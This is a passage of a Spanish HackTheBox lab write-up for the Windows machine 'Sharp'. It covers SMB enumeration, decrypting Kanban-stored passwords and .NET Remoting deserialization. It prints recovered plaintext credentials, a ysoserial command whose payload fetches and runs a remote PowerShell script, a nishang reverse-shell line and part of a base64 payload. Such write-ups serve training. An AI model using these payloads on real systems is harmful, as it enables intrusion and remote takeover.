---
layout      : post
title       : "HackTheBox - Sharp"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png
category    : [ htb ]
tags        : [ crypto, dnSpy, deserialization, visual-studio, SMB ]
---
Máquina Windows nivel difícil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (🤪) y jugaremos con binarios `.exe` para aprovechar **deserializaciones** y errores de configuración.

![303sharpHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303sharpHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [cube0x0](https://www.hackthebox.eu/profile/9164).

ADARLEEEEEEMECHAAAA!

De primeras jugando con el servicio **SMB** encontraremos la carpeta compartida **kanban/** algo sospechosa, entre sus archivos estará `PortableKanban.pk3` el cual dentro contiene encriptadas las contraseñas de unos usuarios, usaremos un exploit para descifrarlas. Obtendremos la contraseña real de un usuario llamado **lars**, nos servirá para autenticarnos al servicio **SMB**, pero en este caso tendremos la carpeta **dev/**, dentro tiene 2 binarios que jugando con `dnSpy` logramos decompilar, esto y bastante research nos servirá para darnos cuenta de que estamos ante una deserializacion, usaremos `ysoserial` para generar payloads y aprovecharnos de la vulnerabilidad y así obtener una **PowerShell** como el usuario **lars**.

En el directorio `c:\Users\lars\Documents\wcf` tenemos unos archivos extraños que hacen alusión al modelo **WCF** (Windows Communication Foundation), jugaremos con **SMB** para transferírnoslos a nuestra máquina, nos daremos cuenta de que el propietario y el que ejecuta el servicio implicado es el usuario **Administrator**. Tendremos que modificar el contenido (aprovecharemos a **Visual Studio** para compilar los binarios) para que nos entable una Reverse Shell, finalmente subiremos los archivos compilados y obtendremos la dichosa Shell como el usuario **Administrator** en el sistema (:

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Un poco de enumeración, le gusta la realidad ;)

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

Tendremos como siempre 3 fases:

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos realizando un escaneo de puertos sobre la máquina para saber que servicios se están ejecutando:

```bash
–» nmap -p- --open -v -Pn 10.10.10.219 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                              |
| --open     | Solo los puertos que están abiertos                                  |
| -Pn        | Evita que realice Host Discovery, como **ping** (P) y el **DNS** (n) |
| -v         | Permite ver en consola lo que va encontrando                         |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p- --open -v -Pn -oG initScan 10.10.10.219
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.219 ()   Status: Up
Host: 10.10.10.219 ()   Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8888/open/tcp//sun-answerbook///    Ignored State: filtered (65531)
# Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 372.21 seconds
```

Muy bien, tenemos los siguientes servicios:

| Puerto | Descripción   |
| ------ | :------------ |
| 135    | [MSRPC](https://www.extrahop.com/resources/protocols/msrpc/): Permite enviar peticiones entre computadores sin necesidad de conocer/entender detalles de la red. |
| 139    | [NetBIOS (SMB)](https://es.wikipedia.org/wiki/NetBIOS): Interfaz que permite enlazar sistemas operativos (servicios) de red con hardware. |
| 445    | [SMB](https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/): Basicamente nos deja compartir archivos y directorios (otras cositas tambien) entre dispositivos de una red. ([Info sobre los puertos 139 y 445](https://www.varonis.com/blog/smb-port/)) |
| 8888   | Sun Answerbook: Aún no lo sabemos bien. |

Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 135,139,445,8888 -sC -sV -Pn 10.10.10.219 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p 135,139,445,8888 -sC -sV -Pn -oN portScan 10.10.10.219
Nmap scan report for 10.10.10.219
Host is up (0.19s latency).

PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m09s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-25T16:17:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112.21 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----: | :------: | :------ |
| 135    | MsRPC    | O.o     |
| 139    | NetBIOS  | u.u     |
| 445    | SMB      | e.e     |
| 8888   | [StorageCraft](https://www.storagecraft.com/es) | [StorageCraft Image Manager](https://www.storagecraft.com/es/productos/imagemanager) |

Listo, demosle e investiguemos más sobre cada servicio.

...

### Puerto 445 [⌖](#puerto-445) {#puerto-445}

Con [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) no logramos enumerar nada, tenemos acceso con credenciales nulas, pero no podemos ejecutar alguna acción (:

Mediante `crackmapexec` podemos ver que sistema operativo está siendo ejecutado:

```bash
–» crackmapexec smb 10.10.10.219 -u '' -p '' 
SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
SMB         10.10.10.219    445    SHARP            [-] Sharp\: STATUS_ACCESS_DENIED
```

Usando [smbmap](https://tools.kali.org/information-gathering/smbmap) obtenemos información sobre los archivos o directorios compartidos en la red ([entre muchas más cosas](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)).

```bash
–» smbmap -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
```

Opa, obtenemos 2 directorios interesantes, `dev` y `kanban`, pero solo tenemos acceso a uno de ellos, intentemos enumerarlo:

* Connect list a shared folder - [hacktricks.xyz](https://book.hacktricks.xyz/pentesting/pentesting-smb#connect-list-a-shared-folder).

```bash
–» smbclient //10.10.10.219/kanban --no-pass
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 14 13:56:03 2020
  ..                                  D        0  Sat Nov 14 13:56:03 2020
  CommandLine.dll                     A    58368  Wed Feb 27 03:06:14 2013
  CsvHelper.dll                       A   141312  Wed Nov  8 08:52:18 2017
  DotNetZip.dll                       A   456704  Wed Jun 22 15:31:52 2016
  Files                               D        0  Sat Nov 14 13:57:59 2020
  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 11:29:32 2017
  Itenso.Sys.dll                      A    19968  Thu Nov 23 11:29:32 2017
  MsgReader.dll                       A   376832  Thu Nov 23 11:29:32 2017
  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 16:20:12 2014
  pkb.zip                             A  2558011  Thu Nov 12 15:04:59 2020
  Plugins                             D        0  Thu Nov 12 15:05:11 2020
  PortableKanban.cfg                  A     5819  Sat Nov 14 13:56:01 2020
  PortableKanban.Data.dll             A   118184  Thu Jan  4 16:12:46 2018
  PortableKanban.exe                  A  1878440  Thu Jan  4 16:12:44 2018
  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 16:12:50 2018
  PortableKanban.pk3                  A     2080  Sat Nov 14 13:56:01 2020
  PortableKanban.pk3.bak              A     2080  Sat Nov 14 13:55:54 2020
  PortableKanban.pk3.md5              A       34  Sat Nov 14 13:56:03 2020
  ServiceStack.Common.dll             A   413184  Wed Sep  6 06:18:22 2017
  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 06:17:30 2017
  ServiceStack.Redis.dll              A   292352  Wed Sep  6 06:02:24 2017
  ServiceStack.Text.dll               A   411648  Tue Sep  5 22:38:18 2017
  User Guide.pdf                      A  1050092  Thu Jan  4 16:14:28 2018

                10357247 blocks of size 4096. 7943298 blocks available
smb: \> 
```

Tenemos varios archivos, pero estar enumerando de a uno en esa sesión no me gusta, podemos intentar dos cosas: hacernos una montura de ese directorio o descargarnos los archivos, vamos a descargarlos :P

Podemos usar `smbget` para esta tarea, aunque existen varias formas (:

```bash
–» smbget -R smb://10.10.10.219/kanban -U ''
Password for [] connecting to //kanban/10.10.10.219: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.219/kanban/CommandLine.dll
smb://10.10.10.219/kanban/CsvHelper.dll
smb://10.10.10.219/kanban/DotNetZip.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Converter.Html.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Interpreter.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Parser.dll
smb://10.10.10.219/kanban/Itenso.Sys.dll
smb://10.10.10.219/kanban/MsgReader.dll
smb://10.10.10.219/kanban/Ookii.Dialogs.dll
smb://10.10.10.219/kanban/pkb.zip
smb://10.10.10.219/kanban/Plugins/PluginsLibrary.dll
smb://10.10.10.219/kanban/PortableKanban.cfg
smb://10.10.10.219/kanban/PortableKanban.Data.dll
smb://10.10.10.219/kanban/PortableKanban.exe
smb://10.10.10.219/kanban/PortableKanban.Extensions.dll
smb://10.10.10.219/kanban/PortableKanban.pk3
smb://10.10.10.219/kanban/PortableKanban.pk3.bak
smb://10.10.10.219/kanban/PortableKanban.pk3.md5
smb://10.10.10.219/kanban/ServiceStack.Common.dll
smb://10.10.10.219/kanban/ServiceStack.Interfaces.dll
smb://10.10.10.219/kanban/ServiceStack.Redis.dll
smb://10.10.10.219/kanban/ServiceStack.Text.dll
smb://10.10.10.219/kanban/User Guide.pdf
Downloaded 7,90MB in 62 seconds
```

![303bash_smbget_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303bash_smbget_files.png)

Listo, así nos queda más fácil manipular los objetos, ahora, a enumerar y ver si hay algo interesante...

Si usamos la herramienta `strings` para ver cadenas de texto entendibles dentro de los binarios, hacia el objeto `PortableKanban.pk3` obtenemos esto:

```bash
–» strings PortableKanban.pk3
{"Columns":[{"Id":"4757781032fd41b2a4511822e2c08850","SortOrder":0,"Name":"Demo","Limit":0,"TaskOrder":{"SortType":"None","Parameters":[{"Field":"Completed","SortOrder":"Descending"},{"Field":"Deadline","SortOrder":"Ascending"},{"Field":"Priority","SortOrder":"Descending"},{"Field":"Topic","SortOrder":"Ascending"},{"Field":"Person","SortOrder":"Ascending"}]},"AutoComplete":false,"ResetCompleted":false,"TimeStamp":637409769443121006}],"Tasks":[{"Id":"33870d6dfe4146718ba0b2c9f7bc05cf","SeriesId":"00000000000000000000000000000000","SortOrder":"oGdBKcFw","ColumnId":"4757781032fd41b2a4511822e2c08850","TopicId":"00000000000000000000000000000000","PersonId":"00000000000000000000000000000000","Text":"New Task","Priority":"Low","Created":"\/Date(1605380100000+0100)\/","CreatedBy":"e8e29158d70d44b1a1ba4949d52790a0","Modified":"\/Date(-62135596800000)\/","ModifiedBy":"00000000000000000000000000000000","Deadline":"\/Date(1605308400000+0100)\/","HasDeadline":false,"Completed":"\/Date(1605308400000+0100)\/","CompletedBy":"00000000000000000000000000000000","Done":false,"Canceled":false,"Link":"","Subtasks":[],"Tags":[],"Estimate":0,"Progress":0,"Points":0,"Comments":[],"CustomFields":{},"TimeStamp":637409769542424146}],"TimeTracks":[],"Persons":[],"Topics":[],"Tags":[],"Views":[],"Users":[{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731},{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}],"ServiceMessages":[],"CustomFieldDescriptors":[],"MetaData":{"Id":"ffffffffffffffffffffffffffffffff","SchemaVersion":"4.2.0.0","SchemaVersionModified":"\/Date(1605380100000+0100)\/","SchemaVersionModifiedBy":"e8e29158d70d44b1a1ba4949d52790a0","SchemaVersionChecked":"\/Date(-62135596800000-0000)\/","SchemaVersionCheckedBy":"00000000000000000000000000000000","TimeStamp":637409769001918463}}
```

Podemos apoyarnos de la herramienta `jq` para que nos lo pase a formato `json`:

```bash
–» strings PortableKanban.pk3 | jq
```

```json
...
  ...
      "TimeStamp": 637409769542424200
    }
  ],
  "TimeTracks": [],
  "Persons": [],
  "Topics": [],
  "Tags": [],
  "Views": [],
  "Users": [
    {
      "Id": "e8e29158d70d44b1a1ba4949d52790a0",
      "Name": "Administrator",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",
      "Role": "Admin",
      "Inactive": false,
      "TimeStamp": 637409769245503700
    },
    {
      "Id": "0628ae1de5234b81ae65c246dd2b4a21",
      "Name": "lars",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
      "Role": "User",
      "Inactive": false,
      "TimeStamp": 637409769265925600
    }
  ],
  "ServiceMessages": [],
  ...
  ...
  }
}
```

...

## Explotación [#](#explotacion) {#explotacion}

Al final vemos un apartado llamado **usuarios** en el que están listados:

* **Administrator** : k+iUoOvQYG98PuhhRC7/rg==
* **lars** : Ua3LyPFM175GN8D3+tqwLA==

La encriptación ta rara y buscando no encontramos nada sobre ella... Pero después de un tiempo estancado sin buscar lo realmente necesario, encontré un exploit muy reciente (por lo tanto tuve mucha suerte) que extrae las contraseñas y las desencripta:

* [https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409).

Lo ejecutamos simplemente pasándole el archivo `PortableKanban.pk3`:

```bash
–» python3 portable_kanban_encrypted.py PortableKanban.pk3
Administrator:G2@$btRSHJYTarg
lars:G123HHrth234gRG
```

Lindo lindo, obtenemos al menos algo diferente a lo anterior. Si validamos de nuevo con `smbmap` tenemos:

```bash
–» smbmap -H 10.10.10.219 -u 'lars' -p 'G123HHrth234gRG'
[+] IP: 10.10.10.219:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
```

Nice son válidas y tenemos acceso a uno de los directorios interesantes: `dev`, las credenciales del usuario `Administrator` no funcionan :P

Me puse a buscar como hubiera sido la desencriptación sin el exploit reciente, pero no encontré algún camino. Me quedo con la duda, al finalizar indagaré más (: sigamos.

Enumeramos con `smbclient` sobre el nuevo recurso:

```bash
–» smbclient //10.10.10.219/dev -U 'lars' 
Enter WORKGROUP\lars's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Nov 15 06:30:13 2020
  ..                                  D        0  Sun Nov 15 06:30:13 2020
  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
  notes.txt                           A       70  Sun Nov 15 08:59:02 2020
  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020

                10357247 blocks of size 4096. 7941868 blocks available
smb: \> 
```

Y procedemos tambien a descargarlos:

```bash
–» smbget -R smb://10.10.10.219/dev -U 'lars'
Password for [lars] connecting to //dev/10.10.10.219: 
Using workgroup WORKGROUP, user lars
smb://10.10.10.219/dev/Client.exe
smb://10.10.10.219/dev/notes.txt
smb://10.10.10.219/dev/RemotingLibrary.dll
smb://10.10.10.219/dev/Server.exe
Downloaded 15,57kB in 18 seconds
```

Tengo un problema con `wine` (que nos permite ejecutar programas basados en `Windows` sobre `Linux`), así que usaremos una máquina virtual con `Windows` para jugar con los binarios.

Buscando por internet: `remoting library exploit`, encontramos un gran artículo que aborda mucho sobre el tema, además nos habla de `dnSpy`, un debugger y decompilador de binarios `.exe`.

* [Increíble articulo sobre **.Net Remoting for Hackers**](https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/).
* [Info sobre **.Net Remoting**](https://www.c-sharpcorner.com/article/net-remoting-in-a-simple-way/).

Si abrimos los archivos, tenemos:

**¬ Server.exe:**

![303win_dnSpy_serverEXE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_dnSpy_serverEXE.png)

* La conexión se generará sobre el puerto `8888`.
* Crea un canal de comunicación (servicio), configurando el nombre de la aplicación como: `SecretSharpDebugApplicationEndpoint`.
* Mientras se tenga la conexión establecida, se mostrara `Registered service`.

**¬ Client.exe:**

![303win_dnSpy_clientEXE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_dnSpy_clientEXE.png)

* Abre una petición hacia: `tcp://localhost:8888/SecretSharpDebugApplicationEndpoint`. 
  * (Entonces sabemos que el puerto `8888` de la máquina se vuelve importante)
* Se autentica con: `debug:SharpApplicationDebugUserPassword123!`.

Ejecutemos los programas:

```powershell
C:\htb_sharp\files>Server.exe
Registered service
```

```powershell
C:\htb_sharp\files>netstat -a

Conexiones activas

  Proto  Dirección local        Dirección remota       Estado
  ...
  TCP    0.0.0.0:8888           WIN:0                  LISTENING
  ...
```

Sip, tal como esperábamos.

```powershell
C:\htb_sharp\files>Client.exe

C:\htb_sharp\files>
```

No obtenemos nada, pero asumimos que hizo la conexión y pues termino :P

...

Pues empecemos a ver como podemos explotar esta locura...

(Entender el tiempo es tiempo perdido u.u)

Después de un rato, encontramos un repositorio que se aprovecha de estos servicios y nos permite entre muchas cosas, aprovecharnos de la siempre peligrosa deserialización insegura...

* [github.com/tyranid/ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService).
* [Articulo de **tyranid** sobre el uso del exploit](https://www.tiraniddo.dev/2014/11/stupid-is-as-stupid-does-when-it-comes.html).
* [Encontramos la descripción de la vulnerabilidad - .NET HTTP Remoting public exposed](https://www.acunetix.com/vulnerabilities/web/net-http-remoting-publicly-exposed/).

> The technology depends on SoapFormater serialization mechanism which is vulnerable to deserialization attack by default. [Acunetix](https://www.acunetix.com/vulnerabilities/web/net-http-remoting-publicly-exposed/)

Info rápida sobre deserialización:

* [What is **deserialization?**](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
* [Insecure deserialization](https://portswigger.net/web-security/deserialization).
* [**C# Sharp** deserialization](https://www.guru99.com/c-sharp-serialization.html).

Entonces, clonamos el repo y nos apoyamos de `Visual Studio 2019` para compilar todo el proyecto. Abrimos el archivo `ExploitRemotingService.sln`, pueda que les pida un paquete de desarrollador (o no) así que simplemente le dan a la opción de descargar, lo descargan y vuelven a abrir el proyecto. (Pues eso tuve que hacer yo :P). Ahora si compilan y se nos crea el ejecutable en la ruta: `C:\htb_sharp\files\ExploitRemotingService\ExploitRemotingService\bin\Debug`, veámoslo:

```powershell
PS C:\htb_sharp\files> .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe
```

![303win_cmd_exploitremotingserviceEXE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_exploitremotingserviceEXE.png)

Perfecto, de los que nos pide tenemos:

* URI: `tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint`.
* --user: `debug`.
* --pass: `SharpApplicationDebugUserPassword123!`.

Asi que su ejecución debe ser:

```powershell
PS C:\htb_sharp\files> .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint -s --user=debug --pass="SharpApplicationDebugUserPassword123!" ver
Error, couldn't detect version, using host: 4.0.30319.42000
Detected version 4 server
...

Server stack trace:
...
```

Pero obtenemos bastantes errores locochones (aunque nos respondió con una versión), jmmm... Leyendo que más podemos hacer con el exploit, vemos la opción de enviar un objeto serializado haciendo uso del parámetro `raw`. Pero como generamos ese objeto? Bueno, buscando tenemos la herramienta `ysoserial`, la cual como su descripción indica, explota aplicaciones que efectúan deserializacion insegura de objetos.

Además tenemos el repositorio `ysoserial.net` que nos ayudara a hacer el proceso con un ejecutable de Windows:

* [github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net/).

Hacemos el mismo proceso que antes, abrimos el archivo `ysoserial.sln`, compilamos y tenemos el binario:

```powershell
PS C:\htb_sharp\files> .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe
```

...

![303win_cmd_ysoserialEXE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_ysoserialEXE.png)

...

Entonces, generemos el objeto, `ysoserial` tiene varios **gadgets** y **plugins**, usaremos el **gadget** llamado `TypeConfuseDelegate`:

```powershell
(*) TypeConfuseDelegate
        Formatters: BinaryFormatter , LosFormatter , NetDataContractSerializer
``` 

Haremos que el formato sea **BinaryFormatter**, guardaremos el output en formato **base64** y finalmente ingresaremos los comandos que queremos ejecutar en el proceso de deserializacion, todo quedaría así:

```powershell
PS C:\htb_sharp\files> .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"
```

> Esto nos generara una cadena en `base64 ` que sera nuestro payload y sera el que adjuntemos al paramentro `raw` de `ExploitRemotingService`.

Donde `P.ps1` es el archivo `Invoke-PowerShellTcp.ps1` del [repositorio nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), el cual nos brinda un montón de herramientas basadas en PowerShell.

En nuestro caso y en el de ese archivo, nos permite indicarle que genere una reverse Shell, para esto debemos modificar una línea:

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
...
```

Tomamos la ultima linea y la agregamos al final del archivo pero sin el `PS >` y la modificamos con nuestra IP y puerto:

```powershell
...
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 4433
```

Entonces lo que hará esto es muy sencillo, una vez estemos en escucha donde tengamos este archivo lanzamos el payload el cual claramente también estará apuntando a este archivo. Una vez se reciba la petición el servidor leerá toooooodo el archivo y como la última línea está en forma de instrucción, el sistema la ejecutara, lo que quiere decir que ejecutara nuestra reverse Shell hacia el puerto `4433`. Démosle...

Breveeeees e.e Pongámonos primero en escucha por el puerto `4433`:

```powershell
PS C:\htb_sharp\files> .\nc.exe -lvp 4433
listening on [any] 4433 ...
```

Ahora creemos el servidor web donde esta nuestro archivo `P.ps1`:

```powershell
PS C:\htb_sharp\files> dir

    Directorio: C:\htb_sharp\files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----    08/02/2021  10:52 a. m.                ExploitRemotingService
d-----    08/02/2021  01:30 p. m.                nishang
d-----    08/02/2021  12:21 p. m.                ysoserial.net
-a----    26/01/2021  11:07 a. m.           5632 Client.exe
-a----    08/02/2021  01:34 p. m.           4533 P.ps1
-a----    26/01/2021  11:07 a. m.           4096 RemotingLibrary.dll
-a----    26/01/2021  11:07 a. m.           6144 Server.exe

PS C:\htb_sharp\files> c:reteteteu_u\Python\Python39\python.exe -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```

Perfecto, ahora solo nos quedaría ejecutar el payload, generemos la cadena en `base64` con **ysoserial**:

> Asegurense de desactivar todo lo que implique `firewall`, tuve algunos problemas por eso :P

```powershell
PS C:\htb_sharp\files> .\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1c